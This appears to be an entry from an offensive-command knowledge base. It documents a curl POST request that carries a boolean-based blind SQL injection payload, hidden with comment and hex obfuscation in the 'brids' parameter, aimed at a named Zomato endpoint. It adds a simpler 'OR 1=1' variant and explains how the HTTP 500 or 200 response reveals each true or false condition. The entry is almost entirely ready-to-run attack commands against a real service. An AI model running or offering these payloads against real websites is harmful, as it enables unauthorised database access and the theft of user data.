---
id: cmd-curl-sqli-zomato
data: >-
  curl -X POST "https://www.zomato.com/█████.php?res_id={RES_ID}" -H "Host:
  www.zomato.com" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13;
  rv:58.0) Gecko/20100101 Firefox/58.0" -H "Accept: */*" -H "Accept-Language:
  nl,en-US;q=0.7,en;q=0.3" -H "Accept-Encoding: gzip, deflate" -H "Cookie:
  PHPSESSID={SESSION_COOKIE};" -H "Content-Type:
  application/x-www-form-urlencoded" --data
  "action=show_support_breakups&brids=[\"')/**/OR/**/MID(0x352e362e33332d6c6f67,1,1)/**/LIKE/**/5/**/%23\"]"
tags:
  - sqli
  - web
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:26.287Z'
verified: false
validated: true
submitted: true
---
# curl-boolean-sqli-test

## Command

```bash
curl -X POST "https://www.zomato.com/█████.php?res_id={RES_ID}" \
  -H "Host: www.zomato.com" \
  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:58.0) Gecko/20100101 Firefox/58.0" \
  -H "Accept: */*" \
  -H "Accept-Language: nl,en-US;q=0.7,en;q=0.3" \
  -H "Accept-Encoding: gzip, deflate" \
  -H "Cookie: PHPSESSID={SESSION_COOKIE};" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "action=show_support_breakups&brids=[\"')/**/OR/**/MID(0x352e362e33332d6c6f67,1,1)/**/LIKE/**/5/**/%23\"]"
```

## Description

This curl command sends a POST request to Zomato's vulnerable endpoint with a boolean SQL injection payload in the brids parameter to test database conditions via response status.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `res_id={RES_ID}` | Restaurant ID in URL | Yes |
| `--data` | Payload with action and brids | Yes |
| `PHPSESSID={SESSION_COOKIE}` | Session cookie header | Yes |
| `brids` | JSON array containing SQL payload | Yes |

## Examples

### Basic Usage

```bash
curl -X POST "https://www.zomato.com/█████.php?res_id=123" --data "action=show_support_breakups&brids=[\"test\"]"
```

### Advanced Usage (with Payload)

```bash
curl -X POST "https://www.zomato.com/█████.php?res_id=123" -H "Cookie: PHPSESSID=abc123;" --data "action=show_support_breakups&brids=[\"')/**/OR/**/1=1/**/%23\"]"
```

## Expected Output

HTTP 500 Internal Server Error if boolean condition is true (e.g., query breaks), or 200 OK if false. Use `-v` for verbose status details.

## Related

- [[procedures/Craft-Boolean-SQLi-Payload-in-JSON-Parameter]]
